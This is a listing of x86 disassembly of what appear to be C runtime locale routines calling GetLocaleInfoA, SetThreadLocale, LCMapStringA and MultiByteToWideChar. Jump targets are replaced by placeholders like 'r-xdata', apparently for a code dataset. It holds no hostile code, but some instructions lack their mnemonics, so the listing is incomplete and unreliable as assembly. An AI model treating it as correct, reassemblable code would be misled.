push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x70 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x74 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x78 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x7c ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x80 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x84 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x88 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x8c ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x90 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0x94 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0x98 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0x9c ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0xa0 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0xa4 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0xa8 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0xac ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0xb0 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0xb4 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
mov edx [ eax + 0xb8 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x20 ]
mov eax [ ecx + 0xbc ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x20 ]
mov ecx [ edx + 0xc0 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x20 ]
push eax
call sub_4c429c
pop ecx
xor edx edx
mov [ ebx + 0x20 ] edx
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
push eax
call sub_4c429c
pop ecx
xor edx edx
mov [ ebx + 0x1c ] edx
mov edx [ eax + 0x4 ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x18 ]
mov eax [ ecx ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x18 ]
mov ecx [ edx + 0x8 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0xc ]
push edx
call sub_4c429c
pop ecx
mov ecx [ ebx + 0x18 ]
mov eax [ ecx + 0x10 ]
push eax
call sub_4c429c
pop ecx
mov edx [ ebx + 0x18 ]
push edx
call sub_4c429c
pop ecx
xor ecx ecx
mov [ ebx + 0x18 ] ecx
pop ebx
pop ebp
retn
push eax
call sub_4c429c
pop ecx
xor edx edx
mov [ ebx + 0x10 ] edx
sub_4cb2ec
push ebp
mov ebp esp
add esp 0xfffffe00
push ebx
push esi
push edi
xor esi esi
mov ebx [ ebp + 0xc ]
call sub_4caa74
push 0x100
push 0x0
lea eax [ ebp - 0x100 ]
push eax
call sub_4c4d44
add esp 0xc
xor eax eax
jmp r-xdata
mov dl [ ebx ]
test dl dl
jne r-xdata
cmp dl 0x3d
jne r-xdata
lea eax [ ebp - 0x200 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4cab2c
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
push 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ecx
call IsValidLocale
test eax eax
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
lea eax [ ebp - 0x100 ]
mov edx rw-data
mov edx [ rw-data ]
mov ecx [ edx + 0x4 ]
push ecx
call SetThreadLocale
mov eax [ rw-data ]
push eax
call sub_4caf40
pop ecx
push esi
mov edx [ rw-data ]
push edx
call sub_4cad84
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl [ ebx ]
mov [ ebp + eax - 0x100 ] dl
inc eax
xor eax eax
push esi
lea edi [ ebp - 0x100 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea esi [ ebp - 0x200 ]
xchg edi esi
mov edx ecx
mov eax edi
shr ecx 0x2
lea eax [ ebp - 0x100 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
push 0x100
push 0x0
push eax
call sub_4c4d44
add esp 0xc
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x100 ]
mov edx rw-data
test cl cl
je r-xdata
call sub_4caa80
mov edx [ rw-data ]
mov eax [ edx + 0x24 ]
push 0x20000102
call SetLastError
call sub_4caa80
xor eax eax
jmp r-xdata
push 0x20000103
call SetLastError
call sub_4caa80
xor eax eax
jmp r-xdata
inc ebx
lea eax [ ebp - 0x100 ]
mov edx rw-data
test cl cl
je r-xdata
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x100 ]
mov edx rw-data
test cl cl
je r-xdata
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
or si 0x2
add eax 0x2
add edx 0x2
test cl cl
jne r-xdata
lea eax [ ebp - 0x100 ]
mov edx rw-data
test cl cl
je r-xdata
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
or si 0x20
add eax 0x2
add edx 0x2
test cl cl
jne r-xdata
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
push 0x100
push 0x0
lea eax [ ebp - 0x100 ]
push eax
call sub_4c4d44
add esp 0xc
xor eax eax
jmp r-xdata
test cl cl
je r-xdata
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
or si 0x10
add eax 0x2
add edx 0x2
test cl cl
jne r-xdata
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
or si 0x4
add eax 0x2
add edx 0x2
test cl cl
jne r-xdata
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
or si 0x1
add eax 0x2
add edx 0x2
test cl cl
jne r-xdata
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
sub_4cb520
push ebp
mov ebp esp
add esp 0xfffffe00
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push 0x200
lea eax [ ebp - 0x200 ]
push eax
push 0x1001
mov edx [ ebx + 0x4 ]
push edx
call GetLocaleInfoA
push rw-data
lea ecx [ ebp - 0x200 ]
push ecx
call sub_4c4dec
add esp 0x8
lea eax [ ebp - 0x200 ]
push eax
call sub_4c4e7c
pop ecx
mov edx 0x200
sub edx eax
push edx
lea ecx [ ebp - 0x200 ]
push ecx
call sub_4c4e7c
pop ecx
lea edx [ ebp - 0x200 ]
add eax edx
push eax
push 0x1002
mov eax [ ebx + 0x4 ]
push eax
call GetLocaleInfoA
push rw-data
lea ecx [ ebp - 0x200 ]
push ecx
call sub_4c4dec
add esp 0x8
push 0xa
lea eax [ ebp - 0x200 ]
push eax
call sub_4c4e7c
pop ecx
lea edx [ ebp - 0x200 ]
add eax edx
push eax
mov ecx [ ebx ]
push ecx
call j_sub_4cd0c0
add esp 0xc
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov edi [ ebx + 0x24 ]
push edi
call sub_4c4e7c
pop ecx
push eax
push esi
call sub_4c4e7c
pop ecx
pop edx
add edx eax
push edx
lea eax [ ebp - 0x200 ]
push eax
call sub_4c4e7c
pop ecx
pop ecx
add ecx eax
add ecx 0x3
push ecx
push edi
call sub_4c42ac
add esp 0x8
mov [ ebx + 0x24 ] eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
push esi
call sub_4c4e7c
pop ecx
mov edi eax
lea eax [ ebp - 0x200 ]
push eax
call sub_4c4e7c
pop ecx
add edi eax
add edi 0x3
push edi
call sub_4c428c
pop ecx
mov edi eax
mov [ ebx + 0x24 ] edi
test edi edi
jne r-xdata
push esi
mov edx [ ebx + 0x24 ]
push edx
call sub_4c4dec
add esp 0x8
push rw-data
mov ecx [ ebx + 0x24 ]
push ecx
call sub_4c4dec
add esp 0x8
lea eax [ ebp - 0x200 ]
push eax
mov edx [ ebx + 0x24 ]
push edx
call sub_4c4dec
add esp 0x8
push rw-data
mov ecx [ ebx + 0x24 ]
push ecx
call sub_4c4dec
add esp 0x8
mov eax 0x1
xor eax eax
jmp r-xdata
push esi
call sub_4c4e7c
pop ecx
push eax
lea edx [ ebp - 0x200 ]
push edx
call sub_4c4e7c
pop ecx
pop ecx
add ecx eax
add ecx 0x3
push ecx
push 0x0
push edi
call sub_4c4d44
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4cb6c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
push 0x0
mov eax [ ebx ]
push eax
mov edx [ ebp + 0xc ]
push edx
push edi
call GetLocaleInfoA
mov esi eax
lea eax [ esi + 0x1 ]
push eax
call sub_4c428c
pop ecx
mov [ ebx ] eax
test ebx ebx
jne r-xdata
inc esi
push esi
mov eax [ ebx ]
push eax
mov edx [ ebp + 0xc ]
push edx
push edi
call GetLocaleInfoA
test eax eax
je r-xdata
push 0xe
call SetLastError
xor eax eax
jmp r-xdata
xor eax eax
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4cb71c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x14 ]
inc esi
push esi
call sub_4c428c
pop ecx
mov ebx eax
test ebx ebx
jne r-xdata
push esi
push ebx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call GetLocaleInfoA
test eax eax
je r-xdata
push 0xe
call SetLastError
xor eax eax
jmp r-xdata
push ebx
call sub_4c429c
pop ecx
xor eax eax
push ebx
call sub_4ccb50
pop ecx
mov edx [ ebp + 0x10 ]
mov [ edx ] ax
push ebx
call sub_4c429c
pop ecx
mov eax 0x1
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4cb778
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
cmp [ ebp + 0x8 ] 0x0
mov edi [ ebp + 0x10 ]
jne r-xdata
push 0x101
call sub_4c428c
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0x100
push rw-data
push edi
call sub_4c4cb0
add esp 0xc
mov eax 0x1
jmp r-xdata
mov edx esi
xor eax eax
push 0xe
call SetLastError
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ edx ] al
inc edx
inc eax
cmp eax 0x100
jl r-xdata
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp + 0xc ]
push ecx
call GetCPInfo
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x1
jbe r-xdata
push esi
call sub_4c429c
pop ecx
xor eax eax
jmp r-xdata
mov [ edi ] 0x0
add edi 0x2
push edi
push 0x100
push esi
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call GetStringTypeA
test eax eax
jne r-xdata
lea edx [ ebp - 0xe ]
jmp r-xdata
push esi
call sub_4c429c
pop ecx
mov eax 0x1
push esi
call sub_4c429c
pop ecx
xor eax eax
jmp r-xdata
mov al [ edx ]
test al al
je r-xdata
cmp [ edx + 0x1 ] 0x0
jne r-xdata
xor ecx ecx
mov cl al
mov eax ecx
lea ecx [ esi + eax ]
jmp r-xdata
xor ebx ebx
mov bl [ edx + 0x1 ]
cmp eax ebx
jle r-xdata
mov [ ecx ] 0x0
inc eax
inc ecx
add edx 0x2
sub_4cb868
push ebp
mov ebp esp
add esp 0xffffffc0
mov ecx 0x10
push ebx
push esi
push edi
mov esi 0x1
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
push esi
push edi
lea edi [ ebp - 0x40 ]
mov esi rw-data
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebx + 0x18 ]
push eax
push 0x16
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x14 ]
push edx
push 0x17
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x1c ]
push ecx
push 0x14
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x15
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x24 ]
push edx
push 0x18
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x28 ]
push ecx
push 0x50
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x51
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
push 0x3
push ebx
push 0x19
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x3
lea edx [ ebx + 0x2 ]
push edx
push 0x1a
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea ecx [ ebx + 0x4 ]
push ecx
push 0x1b
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x3
lea eax [ ebx + 0x6 ]
push eax
push 0x1c
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea edx [ ebx + 0x8 ]
push edx
push 0x52
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x3
lea ecx [ ebx + 0xa ]
push ecx
push 0x53
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea eax [ ebx + 0xc ]
push eax
push 0x54
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea edx [ ebx + 0xe ]
push edx
push 0x55
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea ecx [ ebx + 0x10 ]
push ecx
push 0x56
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea eax [ ebx + 0x12 ]
push eax
push 0x57
push edi
call sub_4cb71c
movsx edx [ ebx + 0x6 ]
add esp 0x10
and esi eax
mov ecx [ ebp + edx * 4 - 0x40 ]
push ecx
call sub_4c4fe8
pop ecx
mov [ ebx + 0x30 ] eax
test esi esi
je r-xdata
xor eax eax
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4cb9e8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi 0x1
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
push ebx
push 0x1d
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x4 ]
push eax
push 0x1e
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x8 ]
push edx
push 0x1003
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0xc ]
push ecx
push 0x1f
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x20
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x14 ]
push edx
push 0x28
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x18 ]
push ecx
push 0x29
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x2a
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x30 ]
push edx
push 0x2b
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x34 ]
push ecx
push 0x2c
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x2d
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x3c ]
push edx
push 0x2e
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x40 ]
push ecx
push 0x2f
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x30
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x48 ]
push edx
push 0x31
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x4c ]
push ecx
push 0x32
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x50 ]
push eax
push 0x33
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x54 ]
push edx
push 0x34
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x58 ]
push ecx
push 0x35
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x5c ]
push eax
push 0x36
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x60 ]
push edx
push 0x37
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x64 ]
push ecx
push 0x38
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x68 ]
push eax
push 0x39
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x6c ]
push edx
push 0x3a
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x70 ]
push ecx
push 0x3b
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x74 ]
push eax
push 0x3c
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x78 ]
push edx
push 0x3d
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x7c ]
push ecx
push 0x3e
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x80 ]
push eax
push 0x3f
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x84 ]
push edx
push 0x40
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x88 ]
push ecx
push 0x41
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x8c ]
push eax
push 0x42
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x90 ]
push edx
push 0x43
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0x94 ]
push ecx
push 0x44
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0x98 ]
push eax
push 0x45
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0x9c ]
push edx
push 0x46
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0xa0 ]
push ecx
push 0x47
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0xa4 ]
push eax
push 0x48
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0xa8 ]
push edx
push 0x49
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0xac ]
push ecx
push 0x4a
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0xb0 ]
push eax
push 0x4b
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0xb4 ]
push edx
push 0x4c
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea ecx [ ebx + 0xb8 ]
push ecx
push 0x4d
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea eax [ ebx + 0xbc ]
push eax
push 0x4e
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
lea edx [ ebx + 0xc0 ]
push edx
push 0x4f
push edi
call sub_4cb6c0
add esp 0xc
and esi eax
push 0x2
lea ecx [ ebx + 0x1c ]
push ecx
push 0x21
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea eax [ ebx + 0x1e ]
push eax
push 0x22
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea edx [ ebx + 0x20 ]
push edx
push 0x23
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x1
lea ecx [ ebx + 0x22 ]
push ecx
push 0x24
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea eax [ ebx + 0x24 ]
push eax
push 0x25
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea edx [ ebx + 0x26 ]
push edx
push 0x26
push edi
call sub_4cb71c
add esp 0x10
and esi eax
push 0x2
lea ecx [ ebx + 0x28 ]
push ecx
push 0x27
push edi
call sub_4cb71c
add esp 0x10
and esi eax
test esi esi
je r-xdata
test esi esi
je r-xdata
push 0x40
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebx + 0x8 ]
push edx
call sub_4c9ef4
add esp 0xc
mov ecx [ ebx + 0x8 ]
push ecx
call sub_4c429c
pop ecx
lea eax [ ebp - 0x40 ]
push eax
call sub_4c4fe8
pop ecx
mov [ ebx + 0x8 ] eax
push 0x40
lea edx [ ebp - 0x40 ]
push edx
mov ecx [ ebx + 0xc ]
push ecx
call sub_4c9ef4
add esp 0xc
mov eax [ ebx + 0xc ]
push eax
call sub_4c429c
pop ecx
lea edx [ ebp - 0x40 ]
push edx
call sub_4c4fe8
pop ecx
mov [ ebx + 0xc ] eax
push 0x40
lea ecx [ ebp - 0x40 ]
push ecx
mov eax [ ebx + 0x10 ]
push eax
call sub_4c9ef4
add esp 0xc
mov edx [ ebx + 0x10 ]
push edx
call sub_4c429c
pop ecx
lea ecx [ ebp - 0x40 ]
push ecx
call sub_4c4fe8
pop ecx
mov [ ebx + 0x10 ] eax
xor eax eax
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4cbe44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebx 0x1
lea eax [ edi + 0x4 ]
push eax
push 0xe
push esi
call sub_4cb6c0
add esp 0xc
and ebx eax
push edi
push 0xf
push esi
call sub_4cb6c0
add esp 0xc
and ebx eax
lea edx [ edi + 0x8 ]
push edx
push 0x10
push esi
call sub_4cb6c0
add esp 0xc
and ebx eax
lea ecx [ edi + 0xc ]
push ecx
push 0x50
push esi
call sub_4cb6c0
add esp 0xc
and ebx eax
lea eax [ edi + 0x10 ]
push eax
push 0x51
push esi
call sub_4cb6c0
add esp 0xc
and ebx eax
push 0x3
add edi 0x14
push edi
push 0x11
push esi
call sub_4cb71c
add esp 0x10
and ebx eax
test ebx ebx
je r-xdata
xor eax eax
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4cbed8
push ebx
push esi
mov ebx rw-data
mov esi rw-data
call sub_4caa74
push 0x30
push 0x0
push ebx
call sub_4c4d44
add esp 0xc
mov edx [ esi ]
mov eax [ edx + 0x18 ]
test eax eax
je r-xdata
mov eax [ edx + 0x14 ]
test eax eax
je r-xdata
mov ecx [ eax + 0x4 ]
mov [ ebx ] ecx
mov ecx [ eax ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xc ]
mov [ ebx + 0x20 ] ecx
mov eax [ eax + 0x10 ]
mov [ ebx + 0x24 ] eax
call sub_4caa80
mov eax ebx
pop esi
pop ebx
retn
mov edx [ eax + 0x20 ]
mov [ ebx + 0xc ] edx
mov ecx [ eax + 0x1c ]
mov [ ebx + 0x10 ] ecx
mov edx [ eax + 0x18 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax + 0x14 ]
mov [ ebx + 0x18 ] ecx
mov edx [ eax + 0x24 ]
mov [ ebx + 0x1c ] edx
mov cl [ eax + 0x2 ]
mov [ ebx + 0x28 ] cl
mov dl [ eax ]
mov [ ebx + 0x29 ] dl
mov cl [ eax + 0xc ]
mov [ ebx + 0x2a ] cl
mov dl [ eax + 0xe ]
mov [ ebx + 0x2b ] dl
mov cl [ eax + 0x10 ]
mov [ ebx + 0x2c ] cl
mov dl [ eax + 0x12 ]
mov [ ebx + 0x2d ] dl
mov cl [ eax + 0x8 ]
mov [ ebx + 0x2e ] cl
mov al [ eax + 0xa ]
mov [ ebx + 0x2f ] al
sub_4cbf7c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx esi
jmp r-xdata
xor eax eax
mov al [ ebx ]
push eax
call sub_4cbfa0
pop ecx
mov [ ebx ] al
test al al
jne r-xdata
inc ebx
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_4cbfa0
push ebp
mov ebp esp
xor edx edx
push ecx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
or eax 0xffffffff
pop ecx
pop ebp
retn
push 0x4
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push 0x100
mov eax [ eax + 0x4 ]
push eax
call LCMapStringA
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
and edx 0xff
xor eax eax
mov al [ edx + rw-data ]
pop ecx
pop ebp
retn
sub_4cbff4
push ebp
mov ebp esp
push ecx
xor edx edx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
test eax eax
jne r-xdata
or eax 0xffffffff
pop ecx
pop ebp
retn
push 0x4
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push 0x100
push eax
call LCMapStringA
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
and ecx 0xff
xor eax eax
mov al [ ecx + rw-data ]
pop ecx
pop ebp
retn
sub_4cc044
push ebp
mov ebp esp
xor edx edx
push ecx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
or eax 0xffffffff
pop ecx
pop ebp
retn
push 0x4
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push 0x200
mov eax [ eax + 0x4 ]
push eax
call LCMapStringA
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
and edx 0xff
xor eax eax
mov al [ edx + rw-data ]
pop ecx
pop ebp
retn
sub_4cc098
push ebp
mov ebp esp
push ecx
xor edx edx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
test eax eax
jne r-xdata
or eax 0xffffffff
pop ecx
pop ebp
retn
push 0x4
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push 0x200
push eax
call LCMapStringA
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
and ecx 0xff
xor eax eax
mov al [ ecx + rw-data ]
pop ecx
pop ebp
retn
sub_4cc0e8
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
cmp [ eax ] 0x0
je r-xdata
test edx edx
jne r-xdata
xor ecx ecx
mov cl [ eax ]
test [ ecx + rw-data ] 0x4
je r-xdata
push 0x0
push 0x0
mov edx [ rw-data ]
push 0x1
push eax
push 0x9
mov ecx [ edx ]
push ecx
call MultiByteToWideChar
test eax eax
jne r-xdata
cmp edx 0x2
jl r-xdata
mov eax 0x1
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
push 0x0
push 0x0
mov edx [ rw-data ]
push 0x2
push eax
push 0x9
mov eax [ edx ]
push eax
call MultiByteToWideChar
test eax eax
jne r-xdata
mov eax 0x2
pop ebp
retn
sub_4cc164
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
xor edx edx
mov dl [ ebx ]
test [ edx + rw-data ] 0x4
je r-xdata
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0x0
test eax eax
je r-xdata
cmp esi 0x2
jl r-xdata
mov eax 0x1
jmp r-xdata
xor ecx ecx
mov cl [ ebx ]
mov [ eax ] cx
xor edx edx
mov edx 0x1
jmp r-xdata
cmp esi 0x2
jl r-xdata
test eax eax
je r-xdata
